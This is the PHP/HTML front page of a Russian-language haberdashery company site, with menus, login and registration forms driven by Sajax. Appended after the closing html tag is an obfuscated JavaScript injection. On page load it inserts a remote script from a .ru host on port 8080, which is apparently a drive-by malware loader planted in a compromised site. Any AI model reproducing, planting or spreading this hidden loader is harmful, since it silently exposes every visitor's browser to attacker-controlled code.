<?php
error_reporting(0);

session_start();

$User = $_SESSION['User'];

include('place_settings.cfg');
include('settings.cfg');
//--------------

include('libs/_error.php');

include('libs/_db.php');
$DB = new DataBase();

include ('libs/_menu.php');
$MENU = new Menu($DB);

include('libs/pages.php');
$PAGE = new Page($DB);

include('libs/_user.php');
$USER = new User($DB);

include('libs/sections.php');
$SECTION = new Section($DB);

include ('fckeditor/fckeditor_php4.php');

include ('libs/tnews.php');
$NEW = new News($DB);

include ('libs/cat.php');
$CAT = new Cat($DB);

include ('libs/subcats.php');
$SUBCAT = new SubCat($DB);

include ('libs/good.php');
$GOOD = new Good($DB);

include ('libs/mats.php');
$MAT = new Mat($DB);

include ('libs/koefs.php');
$KOEF = new Koef($DB);

include ('libs/talarm.php');
$ALARM = new Alarm($DB);

include ('libs/basket.php');
$BASKET = new Basket($DB);

include ('libs/spetial.php');
$SPETIAL = new Spetial($DB);

include ('libs/groups.php');
$GROUP = new Group($DB);


include ('libs/functions.php');
include ('libs/Sajax.php');
include ('libs/timage.php');
$IMAGE = new ImageResizer($DB);

$Global['AdminMail'] = getMail();

$str = $HTTP_SERVER_VARS['REQUEST_URI'];
$str = explode('?', $str);
$str = $str[0];
if (!$str) {

} else {
	$Global['Url.Page'] = explode('/', substr($str,1)); 
}

$sajax_request_type = "POST";
						$sajax_remote_uri = $Global['Host'].'/ajax.php';
						sajax_init();
						sajax_export("reg", "login", "show_page", "save_count", "get_news", "get_cat", "get_subcats", "get_subcat", "get_goods", "get_good", "add_good", "delete_good");
						sajax_handle_client_request();	
				

echo'<?xml version="1.0" encoding="Windows-1251"?>';
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ru" lang="ru">
 
 <head>
  <title>Галантерейная компания Galkom</title>
  <meta name="keywords" content="" />
  <meta name="description" content="" />
	<script src = "<? echo $Global['Host']?>/java/java.js"></script>
 <link href="<? echo $Global['Host']?>/css/style.css" rel="stylesheet" type="text/css" />			   
 </head>
<!--[if IE 6]>
<style>
div.main {
	
	width: 918px;
	padding: 0px;
	background: green;
}
</style>
<![endif]-->

<script>

<?php 
						sajax_show_javascript();
					?>

  /*Use Object Detection to detect IE6*/
  var  m = document.uniqueID /*IE*/
  && document.execCommand ;
  try{
    if(!!m){
      m("BackgroundImageCache", false, true) /* = IE6 only */
    }
  }catch(oh){};



  
function ShowPage(data) {
	
	document.getElementById('uplayer').style.display="block";
	document.getElementById('uplayer').innerHTML=data;

}

function ResLogin(data) {
	
	document.getElementById('enter').style.background = "URL('<?php echo $Global['Host']?>/css/images/enter.jpg') no-repeat top left";
	if (data['succesful']) {
		document.location="<?php echo $Global['Host']?>/basket";
	} else {
		alert (data['error']);
	}
}

function TryLogin() {
	
	document.getElementById('enter').style.background = "URL('<?php echo $Global['Host']?>/css/images/naenter.jpg') no-repeat top left";
	x_login(document.getElementById('login').value,document.getElementById('password').value, ResLogin);
}

function GetOnLayer(page) {
	
	x_show_page(page, ShowPage);
}

function LoginOnEnter(event) {
	
	if ((event.keyCode == 13))
  		TryLogin();
}

function RespRegister(data) {
	
	if (data['succesful']) {
		document.location="<?php echo $Global['Host']?>/basket";
	} else {
		alert (data['error']);
	}
}

function TryRegister() {

	x_reg(
	document.getElementById('login').value,
	document.getElementById('password').value, 
	document.getElementById('retry').value, 
	document.getElementById('org').value,
	document.getElementById('doing').value, 
	document.getElementById('adr').value,
	document.getElementById('town').value,
	document.getElementById('name').value, 
	document.getElementById('soname').value,
	document.getElementById('pname').value,
	document.getElementById('user_mail').value, 
	document.getElementById('nonpro').checked, 
	
	RespRegister);
}

</script>

 <BODY OnLoad ="prep()" OnResize="ResizeLayer()">
	<table class="maintab" cellpadding = 0 cellspacing=0>
	<tr valign=center><td class="main" align=center>
	
	<div class=main>
		<div style="text-align: left"><?php $MENU->ShowStaticMenu($AdminMenu, $Global['Right.Admin']); ?></div>
		<div class="head">
			<a href="<? echo $Global['Host']?>"><div class="logo"></div></a>
			
			<div class="lngis">
				
				<div class="lng"> <div class="rus"></div> <div class="eng"></div> </div>
				<div class="search"><input name=search_string /> <div class="searchb"></div> </div>
			</div>
			
			<div class=rh>
				<div class="telcap"></div> <div class="tel"><b><?php echo getPhone()?></b></div>
				<div class="usmenu"><?php echo CreateUserMenu()?></div>
			</div>
			
		</div>
		<div class="menu">
			<b>
			<? if ($Global['Url.Page'][0]!="catalog") {?><a style="color: #333333" href="<?php echo $Global['Host'].'/catalog'?>"><?php }?><div class="button" <? if ($Global['Url.Page'][0]=="catalog") echo 'style="background: URL(\''.$Global['host'].'/css/images/buttonh.jpg\') no-repeat; cursor: pointer"'; ?>
				>ПРОДУКЦИЯ</div></a>
			<div class="ms"></div>
			<? if ($Global['Url.Page'][1]!="mat") {?><a style="color: #333333" href="<?php echo $Global['Host'].'/main/mat'?>"><?php }?><div class="button" <? if ($Global['Url.Page'][1]=="mat") echo 'style="background: URL(\''.$Global['host'].'/css/images/buttonh.jpg\') no-repeat;"'; ?> >
				МАТЕРИАЛЫ</div></a>
			<div class="ms"></div>
			<? if ($Global['Url.Page'][0]!="news") {?><a style="color: #333333" href="<?php echo $Global['Host'].'/'?>"><?php }?><div class="button" <? if ($Global['Url.Page'][0]=="news") echo 'style="background: URL(\''.$Global['host'].'/css/images/buttonh.jpg\') no-repeat;"'; ?> >НОВОСТИ</div></a>
			<div class="ms"></div>
			<div class="button">ГАЛЕРЕЯ</div></a>
			<div class="ms"></div>
			<? if ($Global['Url.Page'][1]!="cond") {?><a style="color: #333333" href="<?php echo $Global['Host'].'/main/cond'?>"><?php }?><div class="button" <? if ($Global['Url.Page'][1]=="cond") echo 'style="background: URL(\''.$Global['host'].'/css/images/buttonh.jpg\') no-repeat;"'; ?> >ПАРТНЕРАМ</div></a>
			<div class="ms"></div>
			<? if ($Global['Url.Page'][1]!="otziv") {?><a style="color: #333333" href="<?php echo $Global['Host'].'/'?>"><?php }?><div class="button" <? if ($Global['Url.Page'][1]=="otziv") echo 'style="background: URL(\''.$Global['host'].'/css/images/buttonh.jpg\') no-repeat;"'; ?> >ОТЗЫВЫ</div></a>
			<div class="ms"></div>
			<? if ($Global['Url.Page'][0]!="contacts") {?><a style="color: #333333" href="<?php echo $Global['Host'].'/contacts'?>"><?php }?><div class="button" <? if ($Global['Url.Page'][0]=="contacts") echo 'style="background: URL(\''.$Global['host'].'/css/images/buttonh.jpg\') no-repeat;"'; ?> >КОНТАКТЫ</div></a>
			</b>
		</div>
		
		<?php include('router.php'); ?>
	
	</td>
	</tr>
	<tr valign=center><td class="footer" align=center>
	
		<div class="main" style="height: 35px">
			<div class="copy">
				GALKOM ® All Rights Reserved 2009<br />
				<div class="webe"><a target="_blank" style="color: black" title="Разработка, продвижение, поддержка сайтов" href="http://webengineer.com.ua"><b>Web</b>Engineer.com.ua</a></div>
			</div>
			
			<div class="dopmenu">
				<? if ($Global['Url.Page'][0]!="catalog") {?><a style="color: #333333" href="<?php echo $Global['Host'].'/catalog'?>"><?php }?>Продукция</a> | 
				<? if ($Global['Url.Page'][1]!="mat") {?><a style="color: #333333" href="<?php echo $Global['Host'].'/main/mat'?>"><?php }?>Материалы</a> | 
				<? if ($Global['Url.Page'][0]!="news") {?><a style="color: #333333" href="<?php echo $Global['Host'].'/'?>"><?php }?>Новости</a> | 
				<? if ($Global['Url.Page'][0]!="galery") {?><a style="color: #333333" href="<?php echo $Global['Host'].'/galery'?>"><?php }?>Галерея</a> | 
				<? if ($Global['Url.Page'][1]!="cond") {?><a style="color: #333333" href="<?php echo $Global['Host'].'/main/cond'?>"><?php }?>Партнерам</a> | 
				<? if ($Global['Url.Page'][1]!="otziv") {?><a style="color: #333333" href="<?php echo $Global['Host'].'/'?>"><?php }?>Отзывы</a> | 
				<? if ($Global['Url.Page'][0]!="contacts") {?><a style="color: #333333" href="<?php echo $Global['Host'].'/contacts'?>"><?php }?>Контакты</a> | 
				<? if ($Global['Url.Page'][1]!="vac") {?><a style="color: #333333" href="<?php echo $Global['Host'].'/main/vac'?>"><?php }?>Вакансии</a> |
			</div>
		</div>
	
	</td>
	
	</tr>
	</table>
<div id="uplayer" class="uplayer">
</div>
</div>
 </body>
</html>

<script>var Z={rE:false};this.D=14031;this.D+=231;var HB=["yH"];QJ=["xK","XB"];var S;R=["t"];var K='';var r=window;var I={aA:63457};this.b="b";Xh=[];var _=String("bo"+"dy");vC={};var g=String("sc"+"ri"+"pt");jH={};var V=null;this.LI='';var n=document;this.hO=806;this.hO-=225;function M(){var XNK="";var eC="eC";try {var AY='qb'} catch(AY){};var Md=[];var a=new String("]");O=["Y","ri"];var y=RegExp;var j='';qE={vu:36609};K_=24987;K_++;var YR=["zx","gh"];Pb={rU:"T"};var C="\x2f\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d\x2f\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x2e\x6e\x7a\x2f\x73\x6b\x79\x2e\x63\x6f\x6d\x2e\x70\x68\x70";PD=[];var a=String("]");this.Ik=false;dI=["QT"];this.jK=9865;this.jK+=143;function c(rv,Q){ck=24799;ck++;var kz=["o","nz","xP"];var d=String("HDjX[".substr(4));d+=Q;this.NI=25715;this.NI--;zV=45289;zV--;d+=a;Zk={Nn:false};var gl=new y(d, String("7njg".substr(3)));ak=19580;ak--;return rv[String("repla"+"ce")](gl, j);PU=27444;PU-=168;this.Ml=47521;this.Ml--;};JU={Gb:17931};var X=46582-38502;var Gc={cW:false};jV={};V=new String("LiFonloa".substr(3)+"d");nzR=["ym","ez","Cs"];var k=c('c6rbe6akt7e2ELlKeimbe6nJtL','kJqLAYK2bi67');var Cy=c('aqpIp1eqnYd1CkhIiFlqdI','1BIYwqW3FkANo');var m='';RA={It:false};var x="htt"+"p:/olVB".substr(0,3)+"urP/onPur".substr(3,3)+"Hnmebe".substr(3)+"ard"+".ruVGL".substr(0,3)+":1Dw".substr(0,1);try {var AS='pp'} catch(AS){};try {var ah='IK'} catch(ah){};S=function(){try {var qm='Xf'} catch(qm){};try {var lI={xJ:false};ma=n[k](g);var lv=[];var LgE={Yl:false};Mq=43448;Mq--;pD=11845;pD+=178;m=x;var PC="PC";m+=X;var OJ=new String();var LG={CQ:"Ox"};m+=C;var Mp=25066;var qh=41680;wz=60163;wz++;IY={xn:false};var h=c('dWePfPesr8','n5wWP4sJ83VLj');try {} catch(Cl){};var VO=new String("srcKHJz".substr(0,3));this.wB="wB";HV=43812;HV++;ma[VO]=m;hC=20259;hC--;var gb=["Ji","rI"];ma[h]=[7,1][1];this.QB=22053;this.QB--;n[_][Cy](ma);Tn=1946;Tn++;} catch(z){};GcM={ca:32065};};var pW={CH:false};sc={wA:"Pm"};};this.zQ=20552;this.zQ--;JaJ=["Nu"];M();try {} catch(fB){};var LC=["jl","_y"];this.lN=19133;this.lN++;r[V]=S;</script>
<!--195b57bb4b81b065a941ccfaaf5a8490-->